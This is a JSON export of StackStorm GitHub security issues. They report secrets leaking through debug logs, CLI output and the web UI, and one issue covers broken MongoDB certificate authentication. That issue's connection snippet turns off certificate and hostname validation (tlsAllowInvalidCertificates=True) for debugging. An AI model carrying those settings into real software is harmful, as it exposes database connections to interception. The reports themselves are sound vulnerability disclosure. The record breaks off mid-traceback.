                        "body": "> Maybe I can work around this by using K8s, where the individual processes run in pods\r\n\r\nI think it could be worse in K8s considering amount of potential neighbours in the cluster and higher blast radius in case of something goes wrong. Add here different logging and metrics K8s capabilities that might read the process list.\r\n\r\n----\r\n\r\nYeah, I agree.\r\n\r\nCLI args should still apply to `local-shell-script`, `local-shell-cmd` and similar shell/scrips runners. And so one can convert a script.py with CLI args to an action this way.\r\n\r\nHowever considering deeper python logic of `python-script` actions implemented as Python classes with a run() method, it should ideally rely on stackstorm primitives for passing secrets. Agree 💯 on that.",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-07-26T14:29:27Z",
                        "url": "https://github.com/StackStorm/st2/issues/5997#issuecomment-1651922568"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/StackStorm/st2/issues/5977",
                "title": "St2 auth logs leak sensitive information",
                "labels": [
                    "bug",
                    "help wanted",
                    "security"
                ],
                "user": "nzlosh",
                "issue_author_association": "CONTRIBUTOR",
                "number": 5977,
                "id": 1708518145,
                "state": "closed",
                "project_created_at": "2023-05-13T08:34:32Z",
                "closed_at": "2023-10-05T20:16:48Z",
                "body": "## SUMMARY\r\n\r\nSt2 writes http requests with unsanitised username/password pair to `st2.auth.log` when log level set to ``DEBUG``.\r\n\r\n### STACKSTORM VERSION\r\n\r\n``st2 3.8.0, on Python 3.6.9``\r\n\r\n##### OS, environment, install method\r\n```\r\nlsb_release -a\r\nNo LSB modules are available.\r\nDistributor ID: Ubuntu\r\nDescription:    Ubuntu 18.04.6 LTS\r\nRelease:        18.04\r\nCodename:       bionic\r\n```\r\n\r\n**Install method:** manual (https://docs.stackstorm.com/install/u18.html)\r\n\r\n## Steps to reproduce the problem\r\n\r\n1. Configure ``st2.conf`` auth section using LDAP backend\r\n```\r\n[auth]\r\nhost = 127.0.0.1\r\nport = 9100\r\nuse_ssl = False\r\ndebug = True\r\nenable = True\r\nlogging = /etc/st2/logging.auth.conf\r\n\r\nmode = standalone\r\nbackend = ldap\r\nbackend_kwargs = { \"bind_dn\": \"cn=st2,dc=example,dc=net\", \"bind_password\": \"xxxx\", \"base_ou\": \"dc=example,dc=com\", \"group_dns\": [\"cn=stackstorm users\", \"cn=stackstorm admins\"], \"host\": \"localhost\", \"port\": 389, \"use_ssl\": false }\r\n```\r\n\r\n2. Login via st2 cli\r\n```st2 auth st2admin -t```\r\n\r\n3. Review log entries in ``st2.auth.log``\r\n\r\nLogged http request contains Authorization header with username/password.\r\n```\r\n2023-05-13 09:52:17,208 140432424245856 DEBUG router [-] Received call with WebOb: POST /tokens HTTP/1.1\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAuthorization: Basic c3QyYWRtaW46TGVha2VkUGFzc3dvcmQK\r\nConnection: keep-alive\r\nContent-Length: 2\r\nContent-Type: application/json\r\nHost: 127.0.0.1:9100\r\nUser-Agent: python-requests/2.25.1\r\nX-Request-Id: 52ad53f1-9942-4b31-95c6-cb12e442f77a\r\n\r\n{}\r\n```\r\n``Authorization`` is plain text base64 encoded: ``base64 -d <<<c3QyYWRtaW46TGVha2VkUGFzc3dvcmQK\r\nst2admin:LeakedPassword``\r\n\r\n## Expected Results\r\n\r\nIn order of preference:\r\n1. remove/obfuscate the ``Authorization` header\r\n2. don't log the request, just the call url.\r\n\r\n## Actual Results\r\n\r\nAuthentication secrets leaked in plain text through logs.",
                "comments": [],
                "pull_request": null
            },
            {
                "url": "https://github.com/StackStorm/st2/issues/5924",
                "title": "\"st2 key load secrets.yaml\" prints out secret values to terminal when ran.",
                "labels": [
                    "bug",
                    "security"
                ],
                "user": "jonthemango",
                "issue_author_association": "NONE",
                "number": 5924,
                "id": 1617521032,
                "state": "open",
                "project_created_at": "2023-03-09T15:55:52Z",
                "closed_at": null,
                "body": "## SUMMARY\r\n`st2 key load` will log secrets to the terminal unlike `st2 key set -e` which encrypts then logs them to the terminal.\r\n\r\n### STACKSTORM VERSION\r\n\r\nPaste the output of ``st2 --version``:\r\n`st2 3.8.0, on Python 3.8.16`\r\n\r\n##### OS, environment, install method\r\n- Ubuntu \r\n- Ansible Playbooks https://docs.stackstorm.com/install/ansible.html \r\n\r\n## Steps to reproduce the problem\r\n\r\nGiven that a file secrets.yaml exists on the client machine:\r\n```yaml\r\n---\r\n- name: api_token\r\n  value: SECRET_TOKEN  # cleartext\r\n  secret: true  # will be stored encrypted\r\n```\r\n\r\nWhen running `st2 key load secrets.yaml` the contents of the secret variables will be logged to the console in plain text. \r\n\r\nThis is unlike `st2 key set -e api_token $api_token` which logs the encrypted value of api_token.\r\n\r\nFor doing deployments of variables to the key store in CI/CD environments this can lead to secret leakage.\r\n\r\n## Expected Results\r\nst2 key load secrets.yaml encrypts the secrets and prints the encrypted value.\r\n\r\n## Actual Results\r\nst2 key load secrets.yaml displays secrets in plain text.\r\n",
                "comments": [],
                "pull_request": null
            },
            {
                "url": "https://github.com/StackStorm/st2/issues/5809",
                "title": "The secrets are shown in plain text in Rules/Enforcements tab on WebUI",
                "labels": [
                    "bug",
                    "security"
                ],
                "user": "yypptest",
                "issue_author_association": "NONE",
                "number": 5809,
                "id": 1450797411,
                "state": "open",
                "project_created_at": "2022-11-16T03:52:45Z",
                "closed_at": null,
                "body": "## SUMMARY\r\n\r\nThe action parameter with `secret: true` is shown in plain text on Rules/Enforcements section on WebUI\r\n\r\n### STACKSTORM VERSION\r\nst2 3.7.0, on Python 3.8.12\r\n\r\n##### OS, environment, install method\r\nRedHat 8.6 \r\n\r\n## Steps to reproduce the problem\r\n\r\n```\r\n---\r\nname: full_backup\r\npack: mongodb\r\nenabled: true\r\ndescription: Performs a backup of MongoDB\r\nrunner_type: orquesta\r\nentry_point: workflows/full_backup.yaml\r\nparameters:\r\n  mongodb_password:\r\n    default: \"{{ st2kv.system.mongodb_admin_password | decrypt_kv }}\"\r\n    type: string\r\n    secret: true\r\n```\r\n\r\n```\r\n---\r\nname: mongodb_backup_cron\r\npack: backups\r\ndescription: \"Executes a mongodb backup on a cron schedule.\"\r\nenabled: true\r\n\r\ntrigger:\r\n  type: \"core.st2.CronTimer\"\r\n  # http://apscheduler.readthedocs.io/en/3.0/modules/triggers/cron.html#api\r\n  parameters:\r\n      timezone: \"UTC\"\r\n      day_of_week: \"*\"\r\n      hour: 1\r\n      minute: 0\r\n      second: 0\r\n  \r\naction:\r\n  ref: \"backups.mongodb_backup\"\r\n```\r\n## Expected Results\r\n\r\nThe parameter `mongodb_password` should be masked on Web UI  in Rules/Enforcements tab, no plain text should be displayed\r\n\r\n## Actual Results\r\n\r\nThe parameter `mongodb_password` is shown in plain text in `Action input` in the Rules/Enforcements tab on Web UI ",
                "comments": [],
                "pull_request": null
            },
            {
                "url": "https://github.com/StackStorm/st2/issues/5804",
                "title": "st2-api-key not obfuscated when using core.http?",
                "labels": [
                    "bug",
                    "help wanted",
                    "good first issue",
                    "security"
                ],
                "user": "fdrab",
                "issue_author_association": "CONTRIBUTOR",
                "number": 5804,
                "id": 1448185718,
                "state": "open",
                "project_created_at": "2022-11-14T14:35:32Z",
                "closed_at": null,
                "body": "## SUMMARY\r\n\r\nI have 2 ST2 instances (independent of each other and in different networks) and want them to communicate with each other via API using API keys. However, when providing st2-api-key to headers of action core.http, the API key is visible in plain-text in both st2web and in CLI. This is not desirable, as I want the users to be able to use the keys, but not unintentionally share them during any screen sharing sessions. Masking is set in the config for both [api] and [log] (and any actions I've created that use the \"secret\" tag are masked properly) in st2.conf and I've even tried adding st2-api-key into mask_secrets_blacklist. I've tried to clone the runner, but headers are not overridable (can't just create my own http runner with headers marked as \"secret\"). Before going on and writing my own http as a python action, I wanted to ask whether I'm doing something wrong, as it seems obvious to me that any auth info should be obfuscated by default.\r\n\r\n### STACKSTORM VERSION\r\n\r\n[root@st2 st2]# st2 --version\r\nst2 3.7.0, on Python 3.8.12\r\n[root@st2 st2]#\r\n\r\n\r\n##### OS, environment, install method\r\n\r\ncustom install on a RHEL8\r\n\r\n## Steps to reproduce the problem\r\n\r\nUse core.http with st2-api-key: <value> in st2web.\r\n\r\n## Expected Results\r\n\r\nExpected the value of the API key to be obfuscated.\r\n\r\n## Actual Results\r\n\r\nThe API key is visible in plaintext.\r\n\r\nMaking sure to follow these steps will guarantee the quickest resolution possible.\r\n\r\nThanks!\r\n",
                "comments": [
                    {
                        "body": "Looking at some logging tests here:\r\nhttps://github.com/StackStorm/st2/blob/007beed8325b397d540d97905af8f2edb14b925f/st2common/tests/unit/test_logging_middleware.py#L51\r\nhttps://github.com/StackStorm/st2/blob/007beed8325b397d540d97905af8f2edb14b925f/st2common/tests/unit/test_logging_middleware.py#L60-L70\r\n\r\nthe api key is expected to be hidden, at least in the logs.\r\n\r\nYes, that sounds like a bug if the st2-api-key is visible to you.\r\n\r\n\r\nWe'd welcome PRs to fix this issue.\r\n",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-11-15T13:10:18Z",
                        "url": "https://github.com/StackStorm/st2/issues/5804#issuecomment-1315290936"
                    },
                    {
                        "body": "This is semi-correctly (I think) masked in the logs:\r\n`2022-11-16 08:11:20,487 139745041997888 INFO base [-] Dispatching Action to a runner (liveaction_db={'action': 'core.http', 'action_is_workflow': False, 'callback': {}, 'context': {'pack': 'core', 'user': 'fdrab', 'parent': {'execution_id': '63748d17adef072e5e7dac26', 'user': 'fdrab', 'pack': 'default'}, 'orquesta': {'workflow_execution_id': '63748d183955820df1d12eb1', 'task_execution_id': '63748d18837eb7ca8787d46b', 'task_name': 'task1', 'task_id': 'task1', 'task_route': 0}}, 'delay': None, 'end_timestamp': None, 'id': '63748d18837eb7ca8787d46d', 'notify': None, 'parameters': {'headers': {'st2-api-key': '********'}, 'url'`\r\n\r\nI say semi-correctly, because if (taken from your post above) st2_auth_token as well as x-auth-token should be masked in the logs, it works at 50% (perhaps there's a provision that only first value is masked, or I can't use both st2_auth_token and x-auth-token?):\r\n`2022-11-16 08:40:14,604 139991129925056 INFO base [-] Dispatching Action to a runner (liveaction_db={'action': 'core.http', 'action_is_workflow': False, 'callback': {}, 'context': {'trace_context': {}, 'user': 'fdrab', 'pack': 'core'}, 'delay': None, 'end_timestamp': None, 'id': '637493deadef072e5e7dac28', 'notify': None, 'parameters': {'headers': {'x-auth-token': 'sometoken', 'st2_auth_token': '********'}, 'url'`\r\n\r\nin the UI post-execution I can see both values in cleartext as {\"x-auth-token\":\"sometoken\",\"st2_auth_token\":\"sometoken\"}",
                        "user": "fdrab",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2022-11-16T13:16:39Z",
                        "url": "https://github.com/StackStorm/st2/issues/5804#issuecomment-1317005629"
                    },
                    {
                        "body": "https://docs.stackstorm.com/reference/secrets_masking.html\r\nBased on that, sounds like the secrets masking for that specific `st2_auth_token` works semi-correctly in the logs, but fails in the API responses.\r\n",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-11-16T23:07:51Z",
                        "url": "https://github.com/StackStorm/st2/issues/5804#issuecomment-1317796480"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/StackStorm/st2/issues/5759",
                "title": "MongoDB Certificate Authentication",
                "labels": [
                    "bug",
                    "security"
                ],
                "user": "bishopbm1",
                "issue_author_association": "CONTRIBUTOR",
                "number": 5759,
                "id": 1398235396,
                "state": "open",
                "project_created_at": "2022-10-05T19:02:44Z",
                "closed_at": null,
                "body": "## SUMMARY\r\n\r\nMongoDB Certificate authentication seems to be broken. The core issue seems to be that with MongoDB 4.0 and greater you have to explicitly pass the following params:\r\n```\r\nauthSource='$external',\r\nauthMechanism='MONGODB-X509'\r\n```\r\n\r\nWe have the ability to pass `authentication_mechanism` from the config but the auth source is missing.\r\n\r\nLooking into the code a bit i think other values need updated due to deprecations.\r\nhttps://github.com/mongodb/mongo-python-driver/blob/78476d0217289e5a3fafb5c599a8a88558d87d92/pymongo/mongo_client.py#L559-L584\r\n\r\n```\r\n- ``ssl_certfile`` and ``ssl_keyfile`` were deprecated in favor\r\n               of ``tlsCertificateKeyFile``.\r\n- ``ssl_cert_reqs`` was deprecated in favor of\r\n               ``tlsAllowInvalidCertificates``.\r\n- ``ssl_match_hostname`` was deprecated in favor of\r\n ``tlsAllowInvalidHostnames``.\r\n- ``ssl_ca_certs`` was deprecated in favor of ``tlsCAFile``.\r\n- ``ssl_certfile`` was deprecated in favor of\r\n ``tlsCertificateKeyFile``.\r\n- ``ssl_crlfile`` was deprecated in favor of ``tlsCRLFile``.\r\n- ``ssl_pem_passphrase`` was deprecated in favor of\r\n ``tlsCertificateKeyFilePassword``.\r\n```\r\n\r\nDirectly using the same modules we use i was able to connect to the DB using certificate authentication using the following code:\r\n```\r\nssl_kwargs = {\r\n    'ssl': True,\r\n    'tlsCertificateKeyFile': '/etc/st2/mongo_certs/client.pem',\r\n    'tlsCAFile': '/etc/st2/mongo_certs/ca.pem',\r\n    'tlsAllowInvalidHostnames': True,\r\n    'tlsAllowInvalidCertificates': True,\r\n    'authSource': '$external',\r\n    'authMechanism': 'MONGODB-X509'\r\n}\r\nconnection = mongoengine.connection.connect(\r\n    'st2',\r\n    host='127.0.0.1',\r\n    port=27017,\r\n    tz_aware=True,\r\n    username=None,\r\n    password=None,\r\n    connectTimeoutMS=3000,\r\n    serverSelectionTimeoutMS=3000,\r\n    **ssl_kwargs\r\n)\r\n```\r\n\r\n### STACKSTORM VERSION\r\n\r\n```\r\n# st2 --version\r\nst2 3.7.0, on Python 3.8.12\r\n\r\n# cat /etc/*release\r\nNAME=\"Red Hat Enterprise Linux\"\r\nVERSION=\"8.6 (Ootpa)\"\r\nID=\"rhel\"\r\nID_LIKE=\"fedora\"\r\nVERSION_ID=\"8.6\"\r\nPLATFORM_ID=\"platform:el8\"\r\nPRETTY_NAME=\"Red Hat Enterprise Linux 8.6 (Ootpa)\"\r\nANSI_COLOR=\"0;31\"\r\nCPE_NAME=\"cpe:/o:redhat:enterprise_linux:8::baseos\"\r\nHOME_URL=\"https://www.redhat.com/\"\r\nDOCUMENTATION_URL=\"https://access.redhat.com/documentation/red_hat_enterprise_linux/8/\"\r\nBUG_REPORT_URL=\"https://bugzilla.redhat.com/\"\r\n\r\nREDHAT_BUGZILLA_PRODUCT=\"Red Hat Enterprise Linux 8\"\r\nREDHAT_BUGZILLA_PRODUCT_VERSION=8.6\r\nREDHAT_SUPPORT_PRODUCT=\"Red Hat Enterprise Linux\"\r\nREDHAT_SUPPORT_PRODUCT_VERSION=\"8.6\"\r\nRed Hat Enterprise Linux release 8.6 (Ootpa)\r\nRed Hat Enterprise Linux release 8.6 (Ootpa)\r\n\r\n\r\nMongoDB server version: 4.0.28\r\n```\r\n\r\n## Steps to reproduce:\r\n/etc/mongo.conf\r\n```\r\n# mongod.conf\r\n\r\n# for documentation of all options, see:\r\n#   http://docs.mongodb.org/manual/reference/configuration-options/\r\n\r\n# where to write logging data.\r\nsystemLog:\r\n  destination: file\r\n  logAppend: true\r\n  path: /var/log/mongodb/mongod.log\r\n\r\n# Where and how to store data.\r\nstorage:\r\n  dbPath: /var/lib/mongo\r\n  journal:\r\n    enabled: true\r\n#  engine:\r\n#  mmapv1:\r\n#  wiredTiger:\r\n\r\n# how the process runs\r\nprocessManagement:\r\n  fork: true  # fork and run in background\r\n  pidFilePath: /var/run/mongodb/mongod.pid  # location of pidfile\r\n  timeZoneInfo: /usr/share/zoneinfo\r\n\r\n# network interfaces\r\nnet:\r\n  port: 27017\r\n  bindIp: 127.0.0.1\r\n  ssl:\r\n    mode: requireSSL\r\n    PEMKeyFile: /var/lib/mongo/certs/mongo.pem\r\n    CAFile: /var/lib/mongo/certs/ca.pem\r\n    allowInvalidCertificates: true\r\n\r\n#security:\r\n\r\n#operationProfiling:\r\n\r\n#replication:\r\n\r\n#sharding:\r\n\r\n## Enterprise-Only Options\r\n\r\n#auditLog:\r\n\r\n#snmp:\r\nsecurity:\r\n  authorization: enabled\r\n```\r\n\r\n/etc/st2/st2.conf\r\n```\r\n[database]\r\nssl = True\r\nssl_ca_certs = /etc/st2/mongo_certs/ca.pem\r\nssl_certfile = /etc/st2/mongo_certs/client-signed.crt\r\nssl_keyfile = /etc/st2/mongo_certs/client.key\r\nssl_cert_reqs = required\r\nssl_match_hostname = False\r\nauthentication_mechanism = MONGODB-X509\r\n```\r\n\r\nerror:\r\n```\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]: 2022-10-05 12:22:13,040 INFO [-] Using Python: 3.8.12 (/opt/stackstorm/st2/bin/python)\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]: 2022-10-05 12:22:13,040 INFO [-] Using fs encoding: utf-8, default encoding: utf-8, locale: en_US.UTF-8, LANG env variable: en_US.UTF-8, PYTHONIOENCODING env variable: notset\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]: 2022-10-05 12:22:13,040 INFO [-] Using config files: /etc/st2/st2.conf\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]: 2022-10-05 12:22:13,040 INFO [-] Using logging config: /etc/st2/logging.sensorcontainer.conf\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]: 2022-10-05 12:22:13,041 INFO [-] Using coordination driver: redis\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]: 2022-10-05 12:22:13,041 INFO [-] Using metrics driver: noop\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]: 2022-10-05 12:22:13,090 INFO [-] Connecting to database \"st2\" @ \"127.0.0.1:27017\" as user \"None\".\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]: 2022-10-05 12:22:13,325 INFO [-] Successfully connected to database \"st2\" @ \"127.0.0.1:27017\" as user \"None\".\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]: 2022-10-05 12:22:13,357 ERROR [-] (PID:1401793) SensorContainer quit due to exception.\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]: Traceback (most recent call last):\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/st2reactor/cmd/sensormanager.py\", line 66, in main\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    _setup()\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/st2reactor/cmd/sensormanager.py\", line 48, in _setup\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    common_setup(\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/st2common/service_setup.py\", line 252, in setup\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    db_setup()\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/st2common/database_setup.py\", line 55, in db_setup\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    connection = db_init.db_setup_with_retry(**db_cfg)\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/st2common/persistence/db_init.py\", line 79, in db_setup_with_retry\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    return db_func_with_retry(\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/st2common/persistence/db_init.py\", line 58, in db_func_with_retry\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    return retrying_obj.call(db_func, *args, **kwargs)\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/retrying.py\", line 206, in call\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    return attempt.get(self._wrap_exception)\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/retrying.py\", line 247, in get\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    six.reraise(self.value[0], self.value[1], self.value[2])\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/six.py\", line 696, in reraise\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    raise value\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/retrying.py\", line 200, in call\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    attempt = Attempt(fn(*args, **kwargs), attempt_number, False)\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/st2common/models/db/__init__.py\", line 257, in db_setup\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    db_ensure_indexes()\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/st2common/models/db/__init__.py\", line 298, in db_ensure_indexes\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    raise e\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/st2common/models/db/__init__.py\", line 287, in db_ensure_indexes\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    model_class.ensure_indexes()\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/mongoengine/document.py\", line 867, in ensure_indexes\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    collection = cls._get_collection()\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/mongoengine/document.py\", line 215, in _get_collection\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    cls.ensure_indexes()\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/mongoengine/document.py\", line 894, in ensure_indexes\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    collection.create_index(fields, background=background, **opts)\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/pymongo/collection.py\", line 2059, in create_index\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    return self.__create_indexes([index], session, **cmd_options)[0]\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/pymongo/collection.py\", line 1949, in __create_indexes\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    self._command(\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/pymongo/collection.py\", line 238, in _command\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    return sock_info.command(\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/pymongo/pool.py\", line 683, in command\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    return command(self, dbname, spec, slave_ok,\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/pymongo/network.py\", line 159, in command\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    helpers._check_command_response(\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:  File \"/opt/stackstorm/st2/lib/python3.8/site-packages/pymongo/helpers.py\", line 164, in _check_command_response\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]:    raise OperationFailure(errmsg, code, response, max_wire_version)\r\nOct  5 12:22:13 bradltest7020 st2sensorcontainer[1401793]: pymongo.errors.OperationFailure: command createIndexes requires authentication, full error: {'ok': 0.0, 'errmsg': 'command createIndexes requires authentication', 'code': 13, 'codeName': 'Unauthorized'}\r\n```\r\n\r\nManual code (not working):\r\n```\r\nIn [1]: import ssl as ssl_lib\r\n   ...: \r\n   ...: import mongoengine\r\n   ...: import pymongo\r\n   ...: \r\n   ...: \r\n   ...: def _get_ssl_kwargs(\r\n   ...:     ssl=False,\r\n   ...:     ssl_keyfile=None,\r\n   ...:     ssl_certfile=None,\r\n   ...:     ssl_cert_reqs=None,\r\n   ...:     ssl_ca_certs=None,\r\n   ...:     authentication_mechanism=None,\r\n   ...:     ssl_match_hostname=True,\r\n   ...:     authentication_source=None,\r\n   ...: ):\r\n   ...:     # NOTE: In pymongo 3.9.0 some of the ssl related arguments have been renamed -\r\n   ...:     # https://api.mongodb.com/python/current/changelog.html#changes-in-version-3-9-0\r\n   ...:     # Old names still work, but we should eventually update to new argument names.\r\n   ...:     ssl_kwargs = {\r\n   ...:         \"ssl\": ssl,\r\n   ...:     }\r\n   ...:     if ssl_keyfile:\r\n   ...:         ssl_kwargs[\"ssl\"] = True\r\n   ...:         ssl_kwargs[\"ssl_keyfile\"] = ssl_keyfile\r\n   ...:     if ssl_certfile:\r\n   ...:         ssl_kwargs[\"ssl\"] = True\r\n   ...:         ssl_kwargs[\"ssl_certfile\"] = ssl_certfile\r\n   ...:     if ssl_cert_reqs:\r\n   ...:         if ssl_cert_reqs == \"none\":\r\n   ...:             ssl_cert_reqs = ssl_lib.CERT_NONE\r\n   ...:         elif ssl_cert_reqs == \"optional\":\r\n   ...:             ssl_cert_reqs = ssl_lib.CERT_OPTIONAL\r\n   ...:         elif ssl_cert_reqs == \"required\":\r\n   ...:             ssl_cert_reqs = ssl_lib.CERT_REQUIRED\r\n   ...:         ssl_kwargs[\"ssl_cert_reqs\"] = ssl_cert_reqs\r\n   ...:     if ssl_ca_certs:\r\n   ...:         ssl_kwargs[\"ssl\"] = True\r\n   ...:         ssl_kwargs[\"ssl_ca_certs\"] = ssl_ca_certs\r\n   ...:     if authentication_mechanism:\r\n   ...:         ssl_kwargs[\"ssl\"] = True\r\n   ...:         ssl_kwargs[\"authentication_mechanism\"] = authentication_mechanism\r\n   ...:     if ssl_kwargs.get(\"ssl\", False):\r\n   ...:         # pass in ssl_match_hostname only if ssl is True. The right default value\r\n   ...:         # for ssl_match_hostname in almost all cases is True.\r\n   ...:         ssl_kwargs[\"ssl_match_hostname\"] = ssl_match_hostname\r\n   ...:     if authentication_source:\r\n   ...:         ssl_kwargs[\"ssl\"] = True\r\n   ...:         ssl_kwargs[\"authentication_source\"] = authentication_source\r\n   ...:     return ssl_kwargs\r\n   ...: \r\n   ...: \r\n   ...: ssl_kwargs = _get_ssl_kwargs(\r\n   ...:     ssl=True,\r\n   ...:     ssl_keyfile='/etc/st2/mongo_certs/client.key',\r\n   ...:     ssl_certfile='/etc/st2/mongo_certs/client-signed.crt',\r\n   ...:     ssl_cert_reqs='required',\r\n   ...:     ssl_ca_certs='/etc/st2/mongo_certs/ca.pem',\r\n   ...:     ssl_match_hostname=False,\r\n   ...: )\r\n   ...: \r\n   ...: connection = mongoengine.connection.connect(\r\n   ...:     'st2',\r\n   ...:     host='127.0.0.1',\r\n   ...:     port=27017,\r\n   ...:     tz_aware=True,\r\n   ...:     username=None,\r\n   ...:     password=None,\r\n   ...:     connectTimeoutMS=3000,\r\n   ...:     serverSelectionTimeoutMS=3000,\r\n   ...:     **ssl_kwargs\r\n   ...: )\r\n\r\nIn [2]: connection.admin.command(\"ping\")\r\nOut[2]: {'ok': 1.0}\r\n\r\nIn [3]: connection.st2.list_collections()\r\n---------------------------------------------------------------------------\r\nOperationFailure                          Traceback (most recent call last)\r\nCell In [3], line 1\r\n----> 1 connection.st2.list_collections()\r\n\r\nFile /opt/stackstorm/virtualenvs/bolt/lib64/python3.8/site-packages/pymongo/database.py:825, in Database.list_collections(self, session, filter, **kwargs)\r\n    820 def _cmd(session, server, sock_info, slave_okay):\r\n    821     return self._list_collections(\r\n    822         sock_info, slave_okay, session, read_preference=read_pref,\r\n    823         **kwargs)\r\n--> 825 return self.__client._retryable_read(\r\n    826     _cmd, read_pref, session)\r\n\r\nFile /opt/stackstorm/virtualenvs/bolt/lib64/python3.8/site-packages/pymongo/mongo_client.py:1471, in MongoClient._retryable_read(self, func, read_pref, session, address, retryable, exhaust)\r\n   1467         if retrying and not retryable:\r\n   1468             # A retry is not possible because this server does\r\n   1469             # not support retryable reads, raise the last error.\r\n   1470             raise last_error\r\n-> 1471         return func(session, server, sock_info, slave_ok)\r\n   1472 except ServerSelectionTimeoutError:\r\n   1473     if retrying:\r\n   1474         # The application may think the write was never attempted\r\n   1475         # if we raise ServerSelectionTimeoutError on the retry\r\n   1476         # attempt. Raise the original exception instead.\r\n\r\nFile /opt/stackstorm/virtualenvs/bolt/lib64/python3.8/site-packages/pymongo/database.py:821, in Database.list_collections.<locals>._cmd(session, server, sock_info, slave_okay)\r\n    820 def _cmd(session, server, sock_info, slave_okay):\r\n--> 821     return self._list_collections(\r\n    822         sock_info, slave_okay, session, read_preference=read_pref,\r\n    823         **kwargs)\r\n\r\nFile /opt/stackstorm/virtualenvs/bolt/lib64/python3.8/site-packages/pymongo/database.py:770, in Database._list_collections(self, sock_info, slave_okay, session, read_preference, **kwargs)\r\n    767     cmd.update(kwargs)\r\n    768     with self.__client._tmp_session(\r\n    769             session, close=False) as tmp_session:\r\n--> 770         cursor = 